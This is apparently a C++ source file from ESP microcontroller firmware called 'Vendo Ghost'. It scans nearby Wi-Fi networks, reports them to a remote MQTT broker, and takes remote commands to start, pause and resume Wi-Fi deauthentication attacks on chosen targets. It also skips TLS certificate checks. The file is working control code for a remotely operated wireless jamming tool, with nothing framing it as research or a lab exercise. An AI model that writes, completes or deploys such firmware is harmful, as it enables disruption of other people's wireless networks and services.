#include "remote_control.h"
#include "network_manager.h"
#include "mqtt_handler.h"
#include "attack_manager.h"
#include "config.h"
#include "deauth.h"

// ============================================
// STATIC MEMBER DEFINITIONS
// ============================================
WiFiClientSecure RemoteControl::wifiClient;
PubSubClient RemoteControl::mqtt(wifiClient);
bool RemoteControl::attackTriggered = false;
bool RemoteControl::attackModeActive = false;
bool RemoteControl::attackPaused = false;
unsigned long RemoteControl::lastStatusTime = 0;
unsigned long RemoteControl::lastCheckTime = 0;
unsigned long RemoteControl::checkInterval = DEFAULT_CHECK_INTERVAL;
uint16_t RemoteControl::lastReason = 5;
uint16_t RemoteControl::savedReason = 5;
std::vector<AttackTarget> RemoteControl::attackTargets;
std::vector<AttackTarget> RemoteControl::savedAttackTargets;
std::vector<ScannedNetwork> RemoteControl::scanResults;

static std::vector<ScannedNetwork> scanResults;

void RemoteControl::begin() {
    Serial.println("\n╔══════════════════════════════════════╗");
    Serial.println("║     👻 VENDO GHOST INITIALIZING      ║");
    Serial.println("╚══════════════════════════════════════╝");
    
    // Step 1: Scan
    Serial.println("\n📡 STEP 1: Scanning...");
    AttackManager::scanAndReport(scanResults);
    
    // Step 2 & 3: Connect
    Serial.println("\n📶 STEP 2-3: Connecting...");
    if (NetworkManager::connectWiFi(WIFI_SSID, WIFI_PASS, WIFI_TIMEOUT)) {
        if (NetworkManager::connectMQTT(mqtt, wifiClient, 
            [](char* t, byte* p, unsigned int l) {
                MQTTHandler::callback(t, p, l, mqtt, attackTriggered,
                    attackModeActive, attackPaused, attackTargets,
                    savedAttackTargets, savedReason, checkInterval,
                    lastCheckTime, lastReason);
            })) {
            MQTTHandler::publishScanResults(mqtt, scanResults);
            lastCheckTime = millis();
            Serial.println("\n✅ Ready!\n");
        }
    } else {
        Serial.println("\n❌ Failed. Restarting...");
        delay(5000);
        ESP.restart();
    }
}

void RemoteControl::loop() {
    unsigned long currentTime = millis();
    
    if (!attackModeActive && !attackTriggered) {
        handleStandbyMode(currentTime);
        return;
    }
    
    if (attackPaused) {
        handlePausedMode();
        return;
    }
    
    if (currentTime - lastCheckTime >= checkInterval) {
        performMQTTCheckIn();
    }
}

void RemoteControl::handleStandbyMode(unsigned long currentTime) {
    if (!mqtt.connected()) {
        NetworkManager::reconnectMQTT(mqtt, wifiClient,
            [](char* t, byte* p, unsigned int l) {
                MQTTHandler::callback(t, p, l, mqtt, attackTriggered,
                    attackModeActive, attackPaused, attackTargets,
                    savedAttackTargets, savedReason, checkInterval,
                    lastCheckTime, lastReason);
            });
    }
    mqtt.loop();
    
    if (currentTime - lastStatusTime > STATUS_INTERVAL) {
        sendStatus();
        lastStatusTime = currentTime;
    }
}

void RemoteControl::handlePausedMode() {
    if (!mqtt.connected()) {
        NetworkManager::reconnectMQTT(mqtt, wifiClient,
            [](char* t, byte* p, unsigned int l) {
                MQTTHandler::callback(t, p, l, mqtt, attackTriggered,
                    attackModeActive, attackPaused, attackTargets,
                    savedAttackTargets, savedReason, checkInterval,
                    lastCheckTime, lastReason);
            });
    }
    mqtt.loop();
    
    if (attackTriggered && attackModeActive) {
        delay(2000);
        mqtt.loop();
        AttackManager::resumeAttack(savedAttackTargets, savedReason, attackModeActive);
        attackPaused = false;
    }
}

void RemoteControl::performMQTTCheckIn() {
    Serial.println("\n⏰ MQTT Check-in...");
    
    savedAttackTargets = attackTargets;
    savedReason = lastReason;
    stop_deauth();
    attackPaused = true;
    
    if (NetworkManager::connectWiFi(WIFI_SSID, WIFI_PASS, WIFI_CHECK_TIMEOUT)) {
        wifiClient.setInsecure();
        mqtt.setServer(MQTT_BROKER, MQTT_PORT);
        
        if (mqtt.connect((DEVICE_ID + String(random(0xffff), HEX)).c_str(), MQTT_USER, MQTT_PASS)) {
            mqtt.subscribe(TOPIC_CMD);
            mqtt.subscribe(TOPIC_CMD_RETAINED);
            MQTTHandler::publishStatus(mqtt, "checking_in", "attacking", true);
            
            unsigned long start = millis();
            while (millis() - start < MQTT_LISTEN_TIME) {
                mqtt.loop();
                if (!attackModeActive) break;
                delay(10);
            }
        }
    }
    
    lastCheckTime = millis();
    if (attackModeActive) AttackManager::resumeAttack(savedAttackTargets, savedReason, attackModeActive);
    attackPaused = false;
}

void RemoteControl::runAttackLoop() {
    AttackManager::runAttackLoop(attackModeActive, attackPaused);
}

void RemoteControl::sendStatus() {
    MQTTHandler::publishStatus(mqtt, attackModeActive ? "attacking" : "standby");
}